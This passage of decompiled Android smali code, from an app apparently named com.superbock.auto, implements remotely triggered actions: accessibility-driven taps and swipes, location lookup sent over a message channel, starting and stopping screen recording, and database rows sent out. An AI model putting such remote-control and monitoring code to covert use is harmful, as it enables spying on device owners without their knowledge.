.method public final Z(ILjava/lang/String;Ljava/lang/String;Z)V
    .locals 6
    .annotation build Landroidx/annotation/RequiresApi;
        api = 0x18
    .end annotation

    const/4 v0, 0x1

    const/4 v1, 0x0

    const-string v2, ","

    const-string v3, ";"

    if-eq p1, v0, :cond_5

    const/4 v4, 0x2

    if-eq p1, v4, :cond_1

    const/4 p3, 0x3

    if-eq p1, p3, :cond_0

    goto/16 :goto_4

    :cond_0
    invoke-virtual {p0, p2}, Lf3/i$a;->f0(Ljava/lang/String;)Z

    if-eqz p4, :cond_8

    goto/16 :goto_3

    :cond_1
    invoke-virtual {p2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    const/4 p2, 0x0

    :goto_0
    array-length v3, p1

    const-wide/16 v4, 0xc8

    if-ge p2, v3, :cond_3

    if-lez p2, :cond_2

    :try_start_0
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    aget-object v3, p1, p2

    invoke-virtual {v3, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v4

    aget-object v5, v3, v1

    invoke-static {v5}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v5

    aget-object v3, v3, v0

    invoke-static {v3}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v3

    invoke-virtual {v4, v5, v3}, Lcom/superbock/auto/BaseService;->m(FF)V

    add-int/lit8 p2, p2, 0x1

    goto :goto_0

    :cond_3
    invoke-virtual {p3}, Ljava/lang/String;->length()I

    move-result p2

    array-length v1, p1

    if-le p2, v1, :cond_4

    array-length p1, p1

    invoke-virtual {p3, p1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object p2

    invoke-virtual {p2}, Lcom/superbock/auto/BaseService;->i()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p2

    invoke-static {p2, p1, v0}, Li/g;->o(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Z)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-eqz p1, :cond_4

    :try_start_1
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object p2

    invoke-virtual {p2, p1}, Lcom/superbock/auto/BaseService;->n(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_4
    if-eqz p4, :cond_8

    goto :goto_3

    :cond_5
    invoke-virtual {p2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    new-instance p2, Landroid/graphics/Path;

    invoke-direct {p2}, Landroid/graphics/Path;-><init>()V

    const/4 p3, 0x0

    :goto_1
    array-length v3, p1

    if-ge p3, v3, :cond_7

    aget-object v3, p1, p3

    invoke-virtual {v3, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    if-nez p3, :cond_6

    aget-object v4, v3, v1

    invoke-static {v4}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v4

    aget-object v3, v3, v0

    invoke-static {v3}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v3

    invoke-virtual {p2, v4, v3}, Landroid/graphics/Path;->moveTo(FF)V

    goto :goto_2

    :cond_6
    aget-object v4, v3, v1

    invoke-static {v4}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v4

    aget-object v3, v3, v0

    invoke-static {v3}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v3

    invoke-virtual {p2, v4, v3}, Landroid/graphics/Path;->lineTo(FF)V

    :goto_2
    add-int/lit8 p3, p3, 0x1

    goto :goto_1

    :cond_7
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object p3

    const-wide/16 v0, 0x64

    array-length p1, p1

    int-to-long v2, p1

    mul-long v2, v2, v0

    invoke-virtual {p3, p2, v2, v3}, Lcom/superbock/auto/BaseService;->o(Landroid/graphics/Path;J)V

    if-eqz p4, :cond_8

    :goto_3
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide p1

    sput-wide p1, Lf3/i;->e:J

    :cond_8
    :goto_4
    return-void
.end method

.method public final a0(Ls3/g0;IIIILjava/lang/String;Ljava/lang/String;)V
    .locals 18
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    move/from16 v0, p3

    move/from16 v1, p5

    move-object/from16 v2, p6

    move-object/from16 v3, p7

    const-string v4, "na"

    const-string v5, "pk"

    const-string v6, "pa"

    const-string v7, "et"

    const-string v8, "ti"

    const-string v9, "%"

    new-instance v10, Lf/e;

    invoke-direct {v10}, Lf/e;-><init>()V

    const/16 v11, 0x520

    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    const-string v12, "code"

    invoke-virtual {v10, v12, v11}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/i;->a()Lg3/i;

    move-result-object v11

    invoke-static {v11}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v13, 0x0

    :try_start_0
    iget-object v14, v11, Lg3/i;->a:Lt2/g;

    invoke-interface {v14}, Lt2/g;->c()Lz2/h;

    move-result-object v14

    const/4 v15, 0x1

    iput-boolean v15, v14, Lz2/h;->l:Z

    invoke-virtual {v14}, Lz2/k;->g()Lz2/m;

    move-result-object v15

    invoke-static {v13}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v15, v8, v12}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    if-eqz p4, :cond_0

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v15, v7, v12}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_0
    const/4 v12, 0x2

    if-eq v1, v12, :cond_1

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p5 .. p5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v15, v6, v12}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_1
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_2

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v15, v5, v2}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_2
    invoke-static/range {p7 .. p7}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_3

    invoke-virtual {v15}, Lz2/m;->b()Lz2/m;

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v15, v4, v12}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_3
    iput-object v15, v14, Lz2/k;->g:Lz2/m;

    iget-object v11, v11, Lg3/i;->a:Lt2/g;

    invoke-virtual {v14}, Lz2/k;->f()La3/e;

    move-result-object v12

    invoke-interface {v11, v12}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v11
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-wide/16 v11, 0x0

    :goto_0
    invoke-static {v11, v12}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v11

    const-string v12, "total"

    invoke-virtual {v10, v12, v11}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/i;->a()Lg3/i;

    move-result-object v11

    add-int/lit8 v12, p2, -0x1

    mul-int v12, v12, v0

    int-to-long v14, v12

    move-wide/from16 v16, v14

    int-to-long v13, v0

    invoke-static {v11}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    :try_start_1
    iget-object v0, v11, Lg3/i;->a:Lt2/g;

    invoke-interface {v0}, Lt2/g;->c()Lz2/h;

    move-result-object v0

    const/4 v12, 0x0

    invoke-virtual {v0, v8, v12}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static/range {v16 .. v17}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v15

    invoke-virtual {v0, v15}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {v13, v14}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v13

    iput-object v13, v0, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v0}, Lz2/k;->g()Lz2/m;

    move-result-object v13

    const/4 v12, 0x0

    invoke-static {v12}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v13, v8, v12}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    if-eqz p4, :cond_4

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    invoke-virtual {v13, v7, v8}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_4
    const/4 v7, 0x2

    if-eq v1, v7, :cond_5

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p5 .. p5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v13, v6, v1}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_5
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_6

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v13, v5, v2}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_6
    invoke-static/range {p7 .. p7}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v4, v1}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_7
    iput-object v13, v0, Lz2/k;->g:Lz2/m;

    iget-object v1, v11, Lg3/i;->a:Lt2/g;

    invoke-virtual {v0}, Lz2/k;->f()La3/e;

    move-result-object v0

    invoke-interface {v1, v0}, Lt2/g;->k(Lz2/f;)Ljava/util/List;

    move-result-object v0
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    :goto_1
    const-string v1, "rows"

    invoke-virtual {v10, v1, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v10}, Lf/a;->l()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v1, p1

    invoke-interface {v1, v0}, Ls3/g0;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final b0()V
    .locals 11

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v1, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v0, v1}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-eqz v0, :cond_0

    const-string v0, "38"

    invoke-static {v2, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v0

    if-nez v0, :cond_1

    invoke-static {}, Landroid/os/Looper;->prepare()V

    :cond_1
    iget-object v0, p0, Lf3/i$a;->f:Lf3/l;

    if-nez v0, :cond_2

    new-instance v0, Lf3/l;

    iget-object v3, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-direct {v0, v3}, Lf3/l;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lf3/i$a;->f:Lf3/l;

    :cond_2
    iget-object v0, p0, Lf3/i$a;->f:Lf3/l;

    iget-object v3, v0, Lf3/l;->a:Landroid/content/Context;

    const-string v4, "location"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/location/LocationManager;

    iput-object v3, v0, Lf3/l;->g:Landroid/location/LocationManager;

    const-string v10, "gps"

    invoke-virtual {v3, v10}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v3

    iput-boolean v3, v0, Lf3/l;->b:Z

    iget-object v3, v0, Lf3/l;->g:Landroid/location/LocationManager;

    const-string v4, "network"

    invoke-virtual {v3, v4}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v3

    iget-boolean v5, v0, Lf3/l;->b:Z

    if-nez v5, :cond_3

    if-nez v3, :cond_3

    goto :goto_1

    :cond_3
    iput-boolean v2, v0, Lf3/l;->c:Z

    if-eqz v3, :cond_5

    iget-object v3, v0, Lf3/l;->g:Landroid/location/LocationManager;

    invoke-virtual {v3, v4}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v3

    iput-object v3, v0, Lf3/l;->d:Landroid/location/Location;

    if-nez v3, :cond_4

    iget-object v4, v0, Lf3/l;->g:Landroid/location/LocationManager;

    const-wide/32 v6, 0xea60

    const/high16 v8, 0x41200000    # 10.0f

    const-string v5, "network"

    move-object v9, v0

    invoke-virtual/range {v4 .. v9}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    goto :goto_0

    :cond_4
    invoke-virtual {v3}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    iput-wide v3, v0, Lf3/l;->e:D

    iget-object v3, v0, Lf3/l;->d:Landroid/location/Location;

    invoke-virtual {v3}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    iput-wide v3, v0, Lf3/l;->f:D

    :cond_5
    :goto_0
    iget-boolean v3, v0, Lf3/l;->b:Z

    if-eqz v3, :cond_7

    iget-object v3, v0, Lf3/l;->d:Landroid/location/Location;

    if-nez v3, :cond_7

    iget-object v3, v0, Lf3/l;->g:Landroid/location/LocationManager;

    invoke-virtual {v3, v10}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v3

    iput-object v3, v0, Lf3/l;->d:Landroid/location/Location;

    if-nez v3, :cond_6

    iget-object v4, v0, Lf3/l;->g:Landroid/location/LocationManager;

    const-wide/32 v6, 0xea60

    const/high16 v8, 0x41200000    # 10.0f

    const-string v5, "gps"

    move-object v9, v0

    invoke-virtual/range {v4 .. v9}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    goto :goto_1

    :cond_6
    invoke-virtual {v3}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    iput-wide v3, v0, Lf3/l;->e:D

    iget-object v3, v0, Lf3/l;->d:Landroid/location/Location;

    invoke-virtual {v3}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    iput-wide v3, v0, Lf3/l;->f:D

    :cond_7
    :goto_1
    iget-object v0, p0, Lf3/i$a;->f:Lf3/l;

    iget-boolean v3, v0, Lf3/l;->c:Z

    if-eqz v3, :cond_b

    iget-object v1, v0, Lf3/l;->d:Landroid/location/Location;

    if-eqz v1, :cond_8

    invoke-virtual {v1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    iput-wide v1, v0, Lf3/l;->e:D

    :cond_8
    iget-wide v0, v0, Lf3/l;->e:D

    iget-object v2, p0, Lf3/i$a;->f:Lf3/l;

    iget-object v3, v2, Lf3/l;->d:Landroid/location/Location;

    if-eqz v3, :cond_9

    invoke-virtual {v3}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    iput-wide v3, v2, Lf3/l;->f:D

    :cond_9
    iget-wide v2, v2, Lf3/l;->f:D

    sget-object v4, Lf3/i;->a:Ls3/g0;

    if-nez v4, :cond_a

    goto :goto_2

    :cond_a
    new-instance v4, Lf/e;

    invoke-direct {v4}, Lf/e;-><init>()V

    const/16 v5, 0x519

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "code"

    invoke-virtual {v4, v6, v5}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    const-string v1, "lat"

    invoke-virtual {v4, v1, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {v2, v3}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    const-string v1, "lng"

    invoke-virtual {v4, v1, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    sget-object v0, Lf3/i;->a:Ls3/g0;

    invoke-virtual {v4}, Lf/a;->l()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ls3/g0;->b(Ljava/lang/String;)Z

    goto :goto_2

    :cond_b
    const-string v0, "52"

    invoke-static {v2, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :goto_2
    return-void
.end method

.method public final c0(I)V
    .locals 3

    if-nez p1, :cond_1

    sget-boolean p1, Lf3/i;->b:Z

    if-nez p1, :cond_0

    const/4 p1, 0x0

    invoke-static {p1}, Lf3/i;->k(Z)V

    goto :goto_0

    :cond_0
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v2, Lcom/superbock/auto/ScreenService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "stopRecord"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_1
    const/4 v0, 0x1

    if-ne p1, v0, :cond_4

    sget-boolean p1, Lf3/i;->b:Z

    if-eqz p1, :cond_2

    invoke-static {v0}, Lf3/i;->k(Z)V

    goto :goto_0

    :cond_2
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_3

    const/4 p1, 0x0

    const-string v1, "2"

    invoke-static {v0, v1, p1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_3
    new-instance p1, Landroid/content/Intent;

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v1, Lcom/superbock/auto/ScreenActivity;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sput-wide v0, Lf3/i;->c:J

    :cond_4
    :goto_0
    return-void
.end method

.method public final d0(Ls3/g0;IIILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 18
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    move/from16 v0, p3

    move/from16 v1, p4

    move-object/from16 v2, p5

    move-object/from16 v3, p6

    move-object/from16 v4, p7

    const-string v5, "na"

    const-string v6, "js"

    const-string v7, "pk"

    const-string v8, "%"

    const-string v9, "ty"

    const-string v10, "ti"

    new-instance v11, Lf/e;

    invoke-direct {v11}, Lf/e;-><init>()V

    const/16 v12, 0x529

    invoke-static {v12}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    const-string v13, "code"

    invoke-virtual {v11, v13, v12}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/l;->c()Lg3/l;

    move-result-object v12

    invoke-static {v12}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v13, 0x1

    const/4 v14, 0x0

    :try_start_0
    iget-object v15, v12, Lg3/l;->a:Lt2/g;

    invoke-interface {v15}, Lt2/g;->c()Lz2/h;

    move-result-object v15

    iput-boolean v13, v15, Lz2/h;->l:Z

    invoke-virtual {v15}, Lz2/k;->g()Lz2/m;

    move-result-object v13

    invoke-static {v14}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v13, v10, v0}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    const/4 v0, 0x1

    if-lt v1, v0, :cond_0

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v13, v9, v0}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_0
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v13, v7, v3}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_1
    invoke-static/range {p5 .. p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v13, v6, v0}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_2
    invoke-static/range {p7 .. p7}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual {v13}, Lz2/m;->b()Lz2/m;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v13, v5, v0}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_3
    iput-object v13, v15, Lz2/k;->g:Lz2/m;

    iget-object v0, v12, Lg3/l;->a:Lt2/g;

    invoke-virtual {v15}, Lz2/k;->f()La3/e;

    move-result-object v12

    invoke-interface {v0, v12}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v12
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-wide/16 v12, 0x0

    :goto_0
    invoke-static {v12, v13}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    const-string v12, "total"

    invoke-virtual {v11, v12, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {}, Lg3/l;->c()Lg3/l;

    move-result-object v0

    add-int/lit8 v12, p2, -0x1

    move/from16 v13, p3

    mul-int v12, v12, v13

    int-to-long v14, v12

    int-to-long v12, v13

    invoke-static {v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    move-object/from16 v16, v11

    :try_start_1
    iget-object v11, v0, Lg3/l;->a:Lt2/g;

    invoke-interface {v11}, Lt2/g;->c()Lz2/h;

    move-result-object v11

    move-object/from16 v17, v0

    const/4 v0, 0x0

    invoke-virtual {v11, v10, v0}, Lz2/h;->l(Ljava/lang/String;Z)Lz2/h;

    invoke-static {v14, v15}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    invoke-virtual {v11, v0}, Lz2/h;->k(Ljava/lang/Long;)Lz2/h;

    invoke-static {v12, v13}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    iput-object v0, v11, Lz2/h;->m:Ljava/lang/Long;

    invoke-virtual {v11}, Lz2/k;->g()Lz2/m;

    move-result-object v0

    const/4 v12, 0x0

    invoke-static {v12}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    invoke-virtual {v0, v10, v12}, Lz2/m;->f(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    const/4 v10, 0x1

    if-lt v1, v10, :cond_4

    invoke-virtual {v0}, Lz2/m;->b()Lz2/m;

    invoke-static/range {p4 .. p4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v0, v9, v1}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_4
    invoke-static/range {p6 .. p6}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_5

    invoke-virtual {v0}, Lz2/m;->b()Lz2/m;

    invoke-virtual {v0, v7, v3}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_5
    invoke-static/range {p5 .. p5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_6

    invoke-virtual {v0}, Lz2/m;->b()Lz2/m;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v6, v1}, Lz2/m;->h(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    :cond_6
